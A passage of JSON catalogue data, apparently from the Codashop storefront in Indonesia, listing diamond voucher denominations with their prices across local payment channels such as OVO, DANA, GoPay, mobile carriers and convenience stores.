0","deal":false},{"id":1447,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":16000.0,"channelVariablePrice":false,"displayPrice":"Rp. 16.000","deal":false},{"id":20353,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":15200.0,"channelVariablePrice":false,"displayPrice":"Rp. 15.200","deal":true},{"id":29273,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1442,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":20000.0,"channelVariablePrice":false,"displayPrice":"Rp. 20.000","deal":false},{"id":1444,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":20000.0,"channelVariablePrice":false,"displayPrice":"Rp. 20.000","deal":false},{"id":2867,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1441,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1438,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1448,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1445,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":20000.0,"channelVariablePrice":false,"displayPrice":"Rp. 20.000","deal":false},{"id":20352,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":15200.0,"channelVariablePrice":false,"displayPrice":"Rp. 15.200","deal":true},{"id":1443,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":20000.0,"channelVariablePrice":false,"displayPrice":"Rp. 20.000","deal":false},{"id":1446,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":9120,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1440,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":11492,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":16000.0,"channelVariablePrice":false,"displayPrice":"Rp. 16.000","deal":false},{"id":4155,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":15200.0,"channelVariablePrice":false,"displayPrice":"Rp. 15.200","deal":true}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"85 Diamonds","id":210,"sellerId":50,"voucherId":"diamond_codashopIDR_23000","skuHashId":-1624509378,"sortOrderId":8,"voucherPricePoints":[{"id":20355,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":21850.0,"channelVariablePrice":false,"displayPrice":"Rp. 21.850","deal":true},{"id":1451,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":11493,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":23000.0,"channelVariablePrice":false,"displayPrice":"Rp. 23.000","deal":false},{"id":1454,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":30000.0,"channelVariablePrice":false,"displayPrice":"Rp. 30.000","deal":false},{"id":1452,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1456,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":30000.0,"channelVariablePrice":false,"displayPrice":"Rp. 30.000","deal":false},{"id":4156,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":21850.0,"channelVariablePrice":false,"displayPrice":"Rp. 21.850","deal":true},{"id":2868,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1453,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":30000.0,"channelVariablePrice":false,"displayPrice":"Rp. 30.000","deal":false},{"id":20354,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":21850.0,"channelVariablePrice":false,"displayPrice":"Rp. 21.850","deal":true},{"id":1458,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":23000.0,"channelVariablePrice":false,"displayPrice":"Rp. 23.000","deal":false},{"id":9121,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1459,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1450,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1449,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1455,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":30000.0,"channelVariablePrice":false,"displayPrice":"Rp. 30.000","deal":false},{"id":29274,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1457,"voucherDenominationId":210,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"170 Diamonds","id":211,"sellerId":50,"voucherId":"diamond_codashopIDR_46000","skuHashId":-1624509378,"sortOrderId":9,"voucherPricePoints":[{"id":1466,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":60000.0,"channelVariablePrice":false,"displayPrice":"Rp. 60.000","deal":false},{"id":9122,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":46000.0,"channelVariablePrice":false,"displayPrice":"Rp. 46.000","deal":false},{"id":1469,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":46000.0,"channelVariablePrice":false,"displayPrice":"Rp. 46.000","deal":false},{"id":20357,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":43700.0,"channelVariablePrice":false,"displayPrice":"Rp. 43.700","deal":true},{"id":1465,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":60000.0,"channelVariablePrice":false,"displayPrice":"Rp. 60.000","deal":false},{"id":1467,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":60000.0,"channelVariablePrice":false,"displayPrice":"Rp. 60.000","deal":false},{"id":20356,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":43700.0,"channelVariablePrice":false,"displayPrice":"Rp. 43.700","deal":true},{"id":1468,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1460,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1462,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1470,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1463,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":29275,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":11494,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":46000.0,"channelVariablePrice":false,"displayPrice":"Rp. 46.000","deal":false},{"id":1464,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":60000.0,"channelVariablePrice":false,"displayPrice":"Rp. 60.000","deal":false},{"id":1461,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":2869,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":4157,"voucherDenominationId":211,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":43700.0,"channelVariablePrice":false,"displayPrice":"Rp. 43.700","deal":true}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"240 Diamonds","id":599,"sellerId":50,"voucherId":"diamond_codashopIDR_65000","skuHashId":-1624509378,"sortOrderId":10,"voucherPricePoints":[{"id":9123,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":65000.0,"channelVariablePrice":false,"displayPrice":"Rp. 65.000","deal":false},{"id":5205,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":5198,"voucherDenominationId":599,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 